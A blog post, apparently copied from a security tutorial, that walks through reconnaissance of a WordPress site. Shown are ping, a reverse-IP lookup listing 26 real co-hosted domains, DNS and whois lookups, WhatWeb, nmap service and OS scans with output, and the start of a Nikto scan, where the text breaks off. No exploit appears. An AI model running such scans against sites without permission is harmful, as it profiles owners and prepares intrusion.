---
# http://learn.getgrav.org/content/headers
title: How to easy hack a wordpress site or blog
slug: how-to-easy-hack-a-wordpress-site-or-blog
# menu: How to easy hack a wordpress site or blog
date: 03-10-2012
published: true
publish_date: 03-10-2012
# unpublish_date: 03-10-2012
# template: false
# theme: false
visible: true
summary:
    enabled: true
    format: short
    size: 128

taxonomy:
    category:
        - Blog
    tag:
        - backtrack
        - blog
        - free
        - hack
        - hack it easy
        - Hack Tools
        - hacking
        - internet
        - learn to hack
        - tutorial
        - tutorials
        - wordpress
    author:
        - 'Shashank Agarwal'
    migration-status: review
    category: [backtrack,blog,free,hack,hack it easy,Hack Tools,hacking,internet,learn to hack,tutorial,tutorials,wordpress]
    tag: []
author: 'Shashank Agarwal'
metadata:
    author: 'Shashank Agarwal'
#      description: Your page description goes here
#      keywords: HTML, CSS, XML, JavaScript
#      robots: noindex, nofollow
#      og:
#          title: The Rock
#          type: video.movie
#          url: http://www.imdb.com/title/tt0117500/
#          image: http://ia.media-imdb.com/images/rock.jpg
#  cache_enable: false
#  last_modified: true

---

The answer to this question may be difficult to determine, simply because there are so many ways to hack a site. Our aim in this article to show you the techniques most used by hackers in targeting and hacking your site!

Let’s suppose that this is your site: hack-test.com

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan1-300x160.png)

Let’s ping this site to get the server IP:

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan2-300x94.png)

Now we have 173.236.138.113 – this is the server IP where our target site is hosted.

To find other sites hosted on the same server, we will use sameip.org:

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan3-300x159.png)

[Same IP](http://sameip.org/ "Same IP / Reverse IP Lookup")  
26 sites hosted on IP Address 173.236.138.113

 **ID**

  **Domain**

  **Site Link**

  1

  hijackthisforum.com

  [hijackthisforum.com](http://www.hijackthisforum.com/ "visit hijackthisforum.com")

  2

  sportforum.net

  [sportforum.net](http://www.sportforum.net/ "visit sportforum.net")

  3

  freeonlinesudoku.net

  [freeonlinesudoku.net](http://www.freeonlinesudoku.net/ "visit freeonlinesudoku.net")

  4

  cosplayhell.com

  [cosplayhell.com](http://www.cosplayhell.com/ "visit cosplayhell.com")

  5

  videogamenews.org

  [videogamenews.org](http://www.videogamenews.org/ "visit videogamenews.org")

  6

  gametour.com

  [gametour.com](http://www.gametour.com/ "visit gametour.com")

  7

  qualitypetsitting.net

  [qualitypetsitting.net](http://www.qualitypetsitting.net/ "visit qualitypetsitting.net")

  8

  brendanichols.com

  [brendanichols.com](http://www.brendanichols.com/ "visit brendanichols.com")

  9

  8ez.com

  [8ez.com](http://www.8ez.com/ "visit 8ez.com")

  10

  hack-test.com

  [hack-test.com](http://www.hack-test.com/ "visit hack-test.com")

  11

  kisax.com

  [kisax.com](http://www.kisax.com/ "visit kisax.com")

  12

  paisans.com

  [paisans.com](http://www.paisans.com/ "visit paisans.com")

  13

  mghz.com

  [mghz.com](http://www.mghz.com/ "visit mghz.com")

  14

  debateful.com

  [debateful.com](http://www.debateful.com/ "visit debateful.com")

  15

  jazzygoodtimes.com

  [jazzygoodtimes.com](http://www.jazzygoodtimes.com/ "visit jazzygoodtimes.com")

  16

  fruny.com

  [fruny.com](http://www.fruny.com/ "visit fruny.com")

  17

  vbum.com

  [vbum.com](http://www.vbum.com/ "visit vbum.com")

  18

  wuckie.com

  [wuckie.com](http://www.wuckie.com/ "visit wuckie.com")

  19

  force5inc.com

  [force5inc.com](http://www.force5inc.com/ "visit force5inc.com")

  20

  virushero.com

  [virushero.com](http://www.virushero.com/ "visit virushero.com")

  21

  twincitiesbusinesspeernetwork.com

  [twincitiesbusinesspeernetwork.com](http://www.twincitiesbusinesspeernetwork.com/ "visit twincitiesbusinesspeernetwork.com")

  22

  jennieko.com

  [jennieko.com](http://www.jennieko.com/ "visit jennieko.com")

  23

  davereedy.com

  [davereedy.com](http://www.davereedy.com/ "visit davereedy.com")

  24

  joygarrido.com

  [joygarrido.com](http://www.joygarrido.com/ "visit joygarrido.com")

  25

  prismapp.com

  [prismapp.com](http://www.prismapp.com/ "visit prismapp.com")

  26

  utiligolf.com

  [utiligolf.com](http://www.utiligolf.com/ "visit utiligolf.com")

 Twenty-six other websites are hosted on this server [173.236.138.113]. Many hackers will target all other sites on the same server in order to hack your site. But for the purpose of study, we will target your site only and put aside hacking the other sites on same server.

We’ll need more information about your site, such as:

1. DNS records (A, NS, TXT, MX and SOA)
2. Web Server Type (Apache, IIS, Tomcat)
3. Registrar (the company that owns your domain)
4. Your name, address, email and phone
5. Scripts that your site uses (php, asp, asp.net, jsp, cfm)
6. Your server OS (Unix,Linux,Windows,Solaris)
7. Your server open ports to internet (80, 443, 21, etc.)

Let’s start with finding your site’s DNS records. We will use the website “Who.is” to achieve this:

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan4-300x159.png)  


We have discovered that your site DNS records are:

**HACK-TEST.COM DNS RECORDS**

 **Record**

  **Type**

  **TTL**

  **Priority**

  **Content**

  hack-test.com

  A

  4 hours

   173.236.138.113 ()

  hack-test.com

  SOA

  4 hours

   ns1.dreamhost.com. hostmaster.dreamhost.com. 2011032301 15283 1800 1814400 14400

  hack-test.com

  NS

  4 hours

   ns1.dreamhost.com

  hack-test.com

  NS

  4 hours

   ns3.dreamhost.com

  hack-test.com

  NS

  4 hours

   ns2.dreamhost.com

  www.hack-test.com

  A

  4 hours

   173.236.138.113 ()

  

Let’s determine the web server type:

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan5-300x89.png)

As you see, your site web server is Apache. We will determine its version later.

`<code style="margin: 0px; padding: 0px;">`

`<code style="margin: 0px; padding: 0px;"><span style="color: #555555; font-family: Helvetica; font-size: 12pt; margin: 0px; padding: 0px;"><b style="margin: 0px; padding: 0px;">HACK-TEST.COM SITE INFORMATION</b></span>`

`<code style="background-color: white; color: #333333; font-size: 12px; margin: 0px; padding: 0px;">`

`<code style="background-color: white; color: #333333; font-size: 12px; margin: 0px; padding: 0px;"><span style="color: #191919; font-family: Helvetica; font-size: 10pt; margin: 0px; padding: 0px;">IP: <a href="http://www.who.is/whois-ip/173.236.138.113/" style="color: #107d06; margin: 0px; padding: 0px; text-decoration: initial;"><span style="color: #245fa5; margin: 0px; padding: 0px;">173.236.138.113</span></a><br style="margin: 0px; padding: 0px;"></br>Website Status: <a href="http://www.hack-test.com/" style="color: #107d06; margin: 0px; padding: 0px; text-decoration: initial;"><span style="color: #245fa5; margin: 0px; padding: 0px;">active</span></a><br style="margin: 0px; padding: 0px;"></br>Server Type: Apache<br style="margin: 0px; padding: 0px;"></br>Alexa Trend/Rank: <img alt="" src="http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan6.gif" style="border: 0px; margin: 0px; padding: 0px;"></img> 1 Month: 3,213,968 3 Month: 2,161,753<br style="margin: 0px; padding: 0px;"></br>Page Views per Visit: <img alt="" src="http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan7.gif" style="border: 0px; margin: 0px; padding: 0px;"></img> 1 Month: 2.0 3 Month: 3.7</span>`

`<code style="background-color: white; color: #333333; font-size: 12px; margin: 0px; padding: 0px;">`

`<code style="margin: 0px; padding: 0px;">`

Now it is time to find your Doman Registrar and your name, address, email and phone:

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan8-300x137.png)

We have now got your registrar and other vital information about you. We can find the type of scripts on your site (the OS type, web server version) by using a cool tool in backtrack 5 R1 called Whatweb:

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan9-300x5.png)

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan10-300x6.png)

Now we found that your site is using a famous php script called WordPress, that your server os is Fedora Linux and that your web server version is (apache 2.2.15), let’s find open ports in your server.

To do this, we will use nmap:

1 – Find services that run on server

[?](http://resources.infosecinstitute.com/hacking-a-wordpress-site/#)

 01

02

03

04

05

06

07

08

09

10

11

12

13

14

  `<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">root@bt:/# nmap -sV hack-test.com `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Starting Nmap 5.59BETA1 ( <a href="http://nmap.org/" style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; text-decoration: initial; top: auto !important; vertical-align: baseline !important; width: auto !important;">http://nmap.org</a> ) at 2011-12-28 06:39 EET `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Nmap scan report for hack-test.com (192.168.1.2) `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Host is up (0.0013s latency). `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Not shown: 998 filtered ports `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">PORT STATE SERVICE VERSION `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">22/tcp closed ssh `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">80/tcp open http Apache httpd 2.2.15 ((Fedora)) `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">MAC Address: 00:0C:29:01:8A:4D (VMware) `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/" style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; text-decoration: initial; top: auto !important; vertical-align: baseline !important; width: auto !important;">http://nmap.org/submit/</a> . `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Nmap done: 1 IP address (1 host up) scanned in 11.56 seconds `

 

  

 



2 – Find server OS

[?](http://resources.infosecinstitute.com/hacking-a-wordpress-site/#)

 01

02

03

04

05

06

07

08

09

10

11

12

13

14

15

16

17

18

19

  `<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">root@bt:/# nmap -O hack-test.com `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Starting Nmap 5.59BETA1 ( <a href="http://nmap.org/" style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; text-decoration: initial; top: auto !important; vertical-align: baseline !important; width: auto !important;">http://nmap.org</a> ) at 2011-12-28 06:40 EET `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Nmap scan report for hack-test.com (192.168.1.2) `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Host is up (0.00079s latency). `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Not shown: 998 filtered ports `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">PORT STATE SERVICE `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">22/tcp closed ssh `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">80/tcp open http `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">MAC Address: 00:0C:29:01:8A:4D (VMware) `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Device type: general purpose `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Running: Linux 2.6.X `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">OS details: Linux 2.6.22 (Fedora Core 6) `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Network Distance: 1 hop `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">OS detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/" style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; text-decoration: initial; top: auto !important; vertical-align: baseline !important; width: auto !important;">http://nmap.org/submit/</a> . `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Nmap done: 1 IP address (1 host up) scanned in 7.42 seconds`

 

  

 

Only port 80 is open and OS is Linux 2.6.22(Fedora Core 6)

Now that we have gathered all the important information about your site, let’s scan it for vulnerabilities like

Sql injection – Blind sql injection – LFI – RFI – XSS – CSRF, and so forth.

We will use Nikto.pl to gather info, perhaps, some vulnerabilities:

[?](http://resources.infosecinstitute.com/hacking-a-wordpress-site/#)

 01

02

03

04

05

06

07

08

09

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

  `<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">root@bt:/pentest/web/nikto# perl nikto.pl -h <a href="http://hack-test.com/" style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; text-decoration: initial; top: auto !important; vertical-align: baseline !important; width: auto !important;">http://hack-test.com</a> `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">- Nikto v2.1.4 `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">--------------------------------------------------------------------------- `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">+ Target IP: 192.168.1.2 `

